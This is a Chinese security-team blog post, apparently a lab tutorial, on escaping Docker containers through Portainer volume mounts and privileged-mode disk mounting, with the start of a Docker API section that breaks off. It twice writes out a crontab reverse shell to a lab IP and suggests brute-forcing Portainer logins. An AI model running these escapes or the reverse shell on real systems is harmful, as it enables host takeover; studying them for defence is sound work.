---
title: Docker逃逸那些事儿
url: https://mp.weixin.qq.com/s?__biz=Mzg2NTA4OTI5NA==&mid=2247503697&idx=1&sn=e80099f488dd83f9d44a58a1df55bb74&chksm=ce5ded30f92a6426b4300a5905ba75945461bf8c54cf84c8ec8698edc6171c9d5e6c160ca0d2&scene=58&subscene=0#rd
source: Tide安全团队
date: 2022-12-02
fetch_date: 2025-10-04T00:18:13.356909
---

# Docker逃逸那些事儿

![cover_image](https://mmbiz.qpic.cn/mmbiz_jpg/rTicZ9Hibb6RXRiavX8QicCxo3DY92zVa5V4Hye2GLiakpc8OJEEEKwCgGibUyTvxYXVIW67ZribZmibdYuqyibdTj6ibW2Q/0?wx_fmt=jpeg)

# Docker逃逸那些事儿

原创

0h1inge

Tide安全团队

## 什么是Docker

Docker是一个开源的引擎,可以轻松的为任何应用创建一个轻量级的、可移植的、自给自足的容器。开发者在笔记本上编译测试通过的容器可以批量地在生产环境中部署,包括VMs(虚拟机)、bare metal、OpenStack 集群和其他的基础应用平台。

### 判断当前是否为docker环境

首先在我们拿到一个主机权限之后，需要判断该权限所处环境是不是docker，可以使用下面两条命令

1. 是否存在.dockerenv文件，若该文件存在则为docker环境，若不存在该文件则当前环境非docker环境`ls -alh /.dockerenv`

![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RXRiavX8QicCxo3DY92zVa5V4Go7QAicfqQE3WVVGZNg9a4VubcmS3EYFr8fyFR2FqcGSdR2V8U3181Q/640?wx_fmt=png "null")![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RXRiavX8QicCxo3DY92zVa5V4rePSIXp7PB7sgB8uXEMPLdHIbZT6MC6eD5fm4x6TWK1fulc8bx9L5g/640?wx_fmt=png "null")

2. 查询系统进程的cgroup信息，docker环境中的cgroup文件普遍存在docker字段，而真实环境中不存在docker字段`cat /proc/1/cgroup`

![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RXRiavX8QicCxo3DY92zVa5V4JRLkNWrxC8JKdLV6BPv5BnibtKfDPY4Gd78IZmkGOXFBcEQibicDmExqg/640?wx_fmt=png "null")![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RXRiavX8QicCxo3DY92zVa5V4OkeDpIYQ7O6ic3zex813IhsfqjI60ysJjOcWNp2PqyhBEvXCOfmhp2g/640?wx_fmt=png "null")

## Docker逃逸

Docker容器是使用沙盒机制，是单独的系统，理论上是很安全的，通过利用某种手段，再结合执行EXP或POC，就可以返回一个宿主机的高权限shell，并拿到宿主机的root权限，可以直接操作宿主机文件，从容器中逃了出来，因此我们将其称为Docker逃逸漏洞。

### Portainer后台挂载宿主机根目录进行逃逸

Portainer是一个可视化的容器镜像的图形管理工具，利用Portainer可以轻松构建、管理和维护Docker环境，而且完全免费，基于容器化的安装方式，方便高效部署。
需要注意的是后台没有默认账号密码，当第一次登录系统时会提示设置新密码，在实战中可以尝试爆破。

#### 环境搭建

在安装了docker的物理机中运行该命令`docker run -d -p 8000:8000 -p 9000:9000 --name=portainer --restart=always -v /var/run/docker.sock:/var/run/docker.sock -v portainer_data:/data portainer/portainer-ce`

![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RXRiavX8QicCxo3DY92zVa5V4fqeGXUCvufJ9IRgyZ8kicNVdc2jL2wBNhiaicM5zxHJoSZBUjptnicCO1g/640?wx_fmt=png "null")

部署成功后访问宿主机的9000端口，设置用户名与密码

![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RXRiavX8QicCxo3DY92zVa5V4k1p73Xs8lyQxjmZpsYNcCo7P1gZD8X36eZYrnaY5tNFwGYrvyQMqyQ/640?wx_fmt=png "null")![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RXRiavX8QicCxo3DY92zVa5V4HdWRFLRS2P93vaLDaEKhiaoVR71cL6iaicBvuNj6xsIkVpXicBic4efv8zw/640?wx_fmt=png "null")

#### 漏洞利用

进入容器中，添加一个新容器

![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RXRiavX8QicCxo3DY92zVa5V42kfZF6uH32VPEDQhpO9XLx34CmOq0GhCKrpU0s2Ib3uh7bicEFERuvw/640?wx_fmt=png "null")

进入到portainer后台界面

![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RXRiavX8QicCxo3DY92zVa5V4JmPr6kJgYpCduwTyZQAkX38tSVkEYXTL8x2f41YJpdfmgp50nicRnGQ/640?wx_fmt=png "null")

这里给该容器命名并选择一个镜像

![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RXRiavX8QicCxo3DY92zVa5V4fwNhCsX0XMib94eXEqVyVnD6SuSdWn03foDu5rYrAPWNhicg9I2S5otA/640?wx_fmt=png "null")

下滑到Advanced container settings将console设置为interactive & tty

![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RXRiavX8QicCxo3DY92zVa5V4eACEfI2odL5DnicGibINlvk3tuaBF88vqL8chCPexrNIJzPVvSibsBq9g/640?wx_fmt=png "null")

然后到Volumes中将根目录挂载到容器中

![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RXRiavX8QicCxo3DY92zVa5V4soM4hb1jIbFicnklGGqKdr2M7WMZrrDpWnZEDUK58Diao3LFJicnSdTQw/640?wx_fmt=png "null")![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RXRiavX8QicCxo3DY92zVa5V4YrYfpBO7V3SK8PS3Om5PATlr2wSXz5tQSpv5qwTnP2iblt797f78jwQ/640?wx_fmt=png "null")

然后点击部署即可

![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RXRiavX8QicCxo3DY92zVa5V4TrtuqGe4fnXT3XUb1a2wd9icbs4UjLjyKBNrJE8hDmrnF9Mxv1uucFg/640?wx_fmt=png "null")

部署成功后回到容器中，进入到该容器终端内

![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RXRiavX8QicCxo3DY92zVa5V40ZoRZT8IAicLgFK5wqsYVDW2zM39FYc3GvN1QybdWXjicFBKI3ZRa7PA/640?wx_fmt=png "null")![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RXRiavX8QicCxo3DY92zVa5V45tPWCSQpUuicOdKXTgKzhaJOgeQZRDkd0ISU9q7q9q7VmTncXb0ANibw/640?wx_fmt=png "null")

进入到终端后，输入如下命令`ls /tide/
chroot /tide/ bash`

![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RXRiavX8QicCxo3DY92zVa5V4WhvpiaspZh8GAzxPGgYdDLBAF7bwqH3jkzQN5w0bS4Lib0AU6ycOWsOw/640?wx_fmt=png "null")

如此成功逃逸到宿主机中，也可直接反弹shell`echo '* * * * * bash -i >& /dev/tcp/192.168.198.128/8888 0>&1' >> /var/spool/cron/root`

![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RXRiavX8QicCxo3DY92zVa5V4Pc3JNU1HyqtWzs1e8G7PVa65ror6F0wVqZtnYS4aibHIWnDiaUNpm1cQ/640?wx_fmt=png "null")

### privileged特权模式启动容器

特权模式逃逸是一种最简单有效的逃逸方法，该漏洞的原理是宿主机使用root用户或使用sudo命令启动的容器时，docker管理员可通过mount命令将外部宿主机磁盘设备挂载到容器内部，获取对整个宿主机的文件读写权限，可直接通过chroot切换根目录、写ssh公钥和crontab计划等逃逸到宿主机。

#### 特权模式与非特权模式的区别

* • `Linux Capabilities`

1. 1. 普通模式下容器内进程只可以使用有限的一些Linux Capabilities
2. 2. 特权模式下的容器内进程可以使用所有的Linux Capabilities

* • Linux敏感目录 1. 普通模式下，部分内核模块路径比如/proc下的一些目录需要阻止写入、有些又需要允许读写，这些文件目录将会以tmpfs文件系统的方式挂载到容器中，以实现目录mask的需求 2. 特权模式下，这些目录将不再以tmpfs文件系统的方式挂载
* • 任何内核文件都是可读写 1. 普通模式下，部分内核文件系统（sysfs、procfs）会被只读的方式挂载到容器中，以阻止容器内进程随意修改系统内核 2. 特权模式下，内核文件系统将不再以只读的方式被挂载
* • APPArmor和Seccomp

1. 1. 普通模式下，可以通过配置APPArmor或Seccomp相关安全选项
2. 2. 特权模式下，这些AppArmor或Seccomp相关配置将不再生效

* • cgroup读写

1. 1. 默认情况下，只能以只读模式操作cgroup
2. 2. 特权模式下，将可以对cgroup进行读写操作

* • /dev

1. 1. 普通模式下，容器内/dev目录下看不到节点/dev目录下特有的devices
2. 2. 特权模式下，容器内的/dev目录会包含这些来自节点/dev目录下的那些内容

* • SELinux

1. 特权模式下，SELinux相关的安全加固配置将被禁用

2. 普通模式下也可以通过对应的安全选项来禁用SELinux特性

#### 判断方法

在容器中可以使用该命令检测当前容器是否以特权模式启动`cat /proc/self/status | grep Cap`如果是特权模式启动的话，CapEff对应的掩码值在centos中为 0000001fffffffff ，在ubuntu中为0000003fffffffff，如下图

![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RXRiavX8QicCxo3DY92zVa5V4jjq7N1wmuTF044fJ0k9DQoKRicvScO59IiaV1sBibJ7sSkrFPbfcae0UQ/640?wx_fmt=png "null")![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RXRiavX8QicCxo3DY92zVa5V4ysU8rrpja9NDh1OlDich4CfqkcWE9NkFrnngaWPnfr1NbvtqHVrwpeA/640?wx_fmt=png "null")

#### 环境搭建

在安装有docker机器的主机上直接运行该命令，启动该容器即可。`docker run -it --privileged ubuntu:18.04`

![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RXRiavX8QicCxo3DY92zVa5V4HIb9bZJvrt1aKPgsz3y7QQiaJdG67zN3ROo00Jrk6Kn6emibNzib4mwQw/640?wx_fmt=png "null")

#### 漏洞利用

首先我们为了区别宿主机与docker容器的区别，我们先在宿主机中新建一个文件，作为标识区别

![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RXRiavX8QicCxo3DY92zVa5V4PhLYRia3AAhSU1zWqJoKR5OtjM8PvUyEkmg8FCa0M785Tz8ABfjqeEA/640?wx_fmt=png "null")

在启动后我们会进入到docker容器的bash中，在这里我们查看当前主机的docker是否为特权模式启动。`cat /proc/self/status | grep Cap`

![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RXRiavX8QicCxo3DY92zVa5V4HcJDlqmibxj1JBiaAXbNibYroYgv2nZ1es35Z0PTww8C6yvdDyTm0Bfaw/640?wx_fmt=png "null")

我们可以将宿主机目录挂载到该docker容器中，首先查看当前磁盘分区情况，获得宿主机分区`fdisk -l`

![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RXRiavX8QicCxo3DY92zVa5V4hPoeP0hN0nepNESIicFVTlvsq5Wt3EqHgP9IS9syOVgTZdKD9mCiaTGQ/640?wx_fmt=png "null")

这里我们根据分区大小得知到宿主机的磁盘为/dev/dm-0，这时可以直接挂载宿主机的磁盘`mkdir tide
mount /dev/dm-0 /tide/
chroot /tide/`

![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RXRiavX8QicCxo3DY92zVa5V4ndPdxJqmkEjtzOTeNPFBYCmHWSnAwpb7KbnYWSap4oYHwWDpEb7aTg/640?wx_fmt=png "null")

这时我们会进入一个bash会话，在这里可以查看宿主机的/etc/passwd等敏感文件

![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RXRiavX8QicCxo3DY92zVa5V4FEHY3Gfib6uYc5JOSV2ve1naHXa4aVvMch7J2MLzvYmum2855JZpdFQ/640?wx_fmt=png "null")

这时去查看刚刚我们在宿主机根目录中创建的flag.txt文件，看其是否存在，就能判断出我们当前是否已经成功跳出docker容器

![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RXRiavX8QicCxo3DY92zVa5V4faiabr1v1xwukMHOgEwgUXa6VAkpjr3Q4JbxgXsXnB4WHWIErq4sEgg/640?wx_fmt=png "null")

这里可以看到我们现在已经成功跳出了docker容器，获得了宿主机的权限，可以使用计划任务反弹shell`echo '* * * * * bash -i >& /dev/tcp/192.168.198.128/8888 0>&1' >> /var/spool/cron/root`

![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RXRiavX8QicCxo3DY92zVa5V4jSnU4RIFibEshaLlQuYp3F13sXaAyL2ia5EGltIWztk4S0Rbbt9HxOIQ/640?wx_fmt=png "null")

### Docker API 未授权访问

该漏洞起因是因为使用Docker Swarm时，管理的docker 节点上便会开放一个TCP端口2375/2376，绑定在0.0.0.0上，如果没有做限制访问来源的话，攻击者可以通过Doker未授权来控制服务器。

#### 环境搭建

在vulhub中存在该漏洞复现环境，部署命令如下：`cd docker/unauthorized-rce/
docker-compose build
docker-compose up -d
docker-compose ps`

![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RXRiavX8QicCxo3DY92zVa5V4BDEjpCZSDP9StQID4coBFq6bUOHd0gozxCXwYCg7JiaJ8Cl9vYOepNg/640?wx_fmt=png "null")

也可以在真实Docker中部署该环境，部署步骤如下：`#下载环境
curl -o /etc/yum.repos.d/Centos-7.repo http://mirrors.aliyun.com/repo/Centos-7.repo
curl -o /etc/yum.repos.d/docker-ce.repo http://mirrors.aliyun.com/do...